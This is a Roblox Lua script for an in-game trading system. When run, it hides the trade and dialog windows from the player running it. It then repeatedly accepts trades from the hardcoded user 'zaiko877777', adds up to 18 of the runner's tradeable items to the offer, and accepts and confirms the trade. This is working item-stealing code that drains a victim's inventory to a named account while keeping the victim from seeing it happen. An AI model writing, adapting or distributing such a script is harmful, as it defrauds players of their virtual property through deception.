local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local remote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
local acceptRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation")
local confirmRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade")
local targetName = "zaiko877777"
local localPlayer = Players.LocalPlayer

-- Disable DialogApp and TradeApp GUIs for the local player.
pcall(function()
    localPlayer.PlayerGui:WaitForChild("DialogApp").Enabled = false
end)
pcall(function()
    localPlayer.PlayerGui:WaitForChild("TradeApp").Enabled = false
end)

local fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
local loadModule = fsys.load
local ClientData = loadModule("ClientData")
local ItemDB = loadModule("ItemDB")
local ItemHider = loadModule("ItemHider")
local BackpackLockTracker = loadModule("BackpackLockTracker")

local tradeState = {
    skipped = {},
    added = {},
    phase = "idle",
    lastActionAt = 0,
    lastAcceptAt = 0,
    lastConfirmAt = 0
}

local function getItemDefinition(item)
    if type(item) ~= "table" then
        return nil
    end

    if type(item.category) ~= "string" or type(item.kind) ~= "string" then
        return nil
    end

    local categoryTable = ItemDB[item.category]
    if type(categoryTable) ~= "table" then
        return nil
    end

    return categoryTable[item.kind]
end

local function isItemTradeable(item)
    local definition = getItemDefinition(item)
    if not definition then
        return false
    end

    if not ItemHider or type(ItemHider.is_item_tradeable) ~= "function" then
        return true
    end

    if not ItemHider.is_item_tradeable(definition, item) then
        return false
    end

    if BackpackLockTracker and type(BackpackLockTracker.is_locked) == "function" and BackpackLockTracker.is_locked(item) then
        return false
    end

    return true
end

local function getActiveTradeWithTarget()
    local trade = ClientData.get("trade")
    if type(trade) ~= "table" then
        return nil
    end

    local sender = trade.sender
    local recipient = trade.recipient
    if not sender or not recipient then
        return nil
    end

    if sender ~= localPlayer and recipient ~= localPlayer then
        return nil
    end

    local partner = sender == localPlayer and recipient or sender
    if not partner or partner.Name ~= targetName then
        return nil
    end

    return trade
end

local function getMyOffer(trade)
    if trade.sender == localPlayer then
        return trade.sender_offer
    end
    return trade.recipient_offer
end

local function getOfferCount(trade)
    local myOffer = getMyOffer(trade)
    if type(myOffer) ~= "table" or type(myOffer.items) ~= "table" then
        return 0
    end
    return #myOffer.items
end

local function addAllItemsFromInventory(maxItems)
    local ok, inventory = pcall(function()
        return ClientData.get("inventory")
    end)

    if not ok or type(inventory) ~= "table" then
        return false
    end

    local trade = getActiveTradeWithTarget()
    if not trade then
        return false
    end

    local now = os.clock()
    if now - tradeState.lastActionAt < 0.35 then
        return false
    end
    tradeState.lastActionAt = now

    local myOffer = getMyOffer(trade)
    if type(myOffer) ~= "table" or type(myOffer.items) ~= "table" then
        return false
    end
    if myOffer.negotiated then
        return false
    end

    local alreadyInOffer = {}
    for _, offerItem in ipairs(myOffer.items) do
        if type(offerItem) == "table" and type(offerItem.unique) == "string" then
            alreadyInOffer[offerItem.unique] = true
        end
    end

    local offerUniques = {}
    local seen = {}
    for _, categoryTable in pairs(inventory) do
        if type(categoryTable) == "table" then
            for _, item in pairs(categoryTable) do
                if type(item) == "table" and type(item.unique) == "string" then
                    local unique = item.unique
                    if not seen[unique] and not alreadyInOffer[unique] then
                        seen[unique] = true
                        if isItemTradeable(item) then
                            table.insert(offerUniques, unique)
                        else
                            tradeState.skipped[unique] = true
                        end
                    end
                end
            end
        end
    end

    local limit = math.clamp(tonumber(maxItems) or 18, 1, 18)
    local freeSlots = 18 - #myOffer.items
    limit = math.min(limit, freeSlots)

    if limit <= 0 then
        tradeState.phase = "ready_to_confirm"
        return false
    end

    local sent = 0

    for _, unique in ipairs(offerUniques) do
        if sent >= limit then
            break
        end
        if tradeState.added[unique] then
            continue
        end
        addItemRemote:FireServer(unique)
        tradeState.added[unique] = true
        sent = sent + 1
        task.wait(0.1)
    end

    if sent > 0 and (getOfferCount(trade) >= 18 or sent >= limit) then
        tradeState.phase = "ready_to_confirm"
    elseif sent == 0 and #offerUniques == 0 and getOfferCount(trade) > 0 then
        -- Nothing left to add, move to accept/confirm.
        tradeState.phase = "ready_to_confirm"
    else
        tradeState.phase = "adding"
    end

    return sent > 0
end

local function acceptAndConfirmTrade(trade)
    if type(trade) ~= "table" then
        trade = getActiveTradeWithTarget()
    end
    if not trade then
        return false
    end

    if tradeState.phase ~= "ready_to_confirm" and tradeState.phase ~= "accepted_waiting_confirmation" then
        return false
    end

    local now = os.clock()

    if trade.current_stage == "negotiation" then
        if now - tradeState.lastAcceptAt < 1.2 then
            return false
        end
        acceptRemote:FireServer()
        tradeState.lastAcceptAt = now
        tradeState.phase = "accepted_waiting_confirmation"
        return true
    end

    if trade.current_stage == "confirmation" then
        if now - tradeState.lastConfirmAt < 1.2 then
            return false
        end
        confirmRemote:FireServer()
        tradeState.lastConfirmAt = now
        tradeState.phase = "confirming"
        return true
    end

    return false
end

local lastAddAttempt = 0

while true do
    local targetPlayer = Players:FindFirstChild(targetName)

    if targetPlayer then
        remote:InvokeServer(targetPlayer, true)

        -- Retry every 2 seconds while target is present so items are added
        -- after the trade session is actually active.
        if os.clock() - lastAddAttempt >= 2 then
            lastAddAttempt = os.clock()
            local trade = getActiveTradeWithTarget()
            if trade then
                if trade.current_stage == "negotiation" then
                    if tradeState.phase == "ready_to_confirm" or tradeState.phase == "accepted_waiting_confirmation" then
                        acceptAndConfirmTrade(trade)
                    else
                        addAllItemsFromInventory(18)
                    end
                elseif trade.current_stage == "confirmation" then
                    acceptAndConfirmTrade(trade)
                end
            else
                tradeState.phase = "idle"
                tradeState.added = {}
                tradeState.skipped = {}
            end
        end
    else
        tradeState.phase = "idle"
        tradeState.added = {}
        tradeState.skipped = {}
    end

    task.wait(1)
end
